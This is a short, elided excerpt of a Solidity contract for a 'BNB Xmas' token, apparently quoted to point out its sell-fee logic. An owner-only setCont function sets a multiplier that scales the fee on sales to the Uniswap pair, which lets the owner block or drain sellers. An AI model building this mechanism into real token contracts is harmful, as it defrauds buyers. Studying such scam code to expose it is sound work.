...
contract BXMAS is Context, IERC20 { 
    string private _name = "BNB Xmas";
    string private _symbol = unicode"BXMAS";
    ...
    function setCont(uint8 const) external onlyOwner {
        _const = const;
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){ _tOwned[sender] = _tOwned[sender]-tAmount; _tOwned[recipient] = _tOwned[recipient]+tAmount;
            ...
            if (recipient == uniswapV2Pair){sellAmt = tAmount*_sell_free*_const/100;}
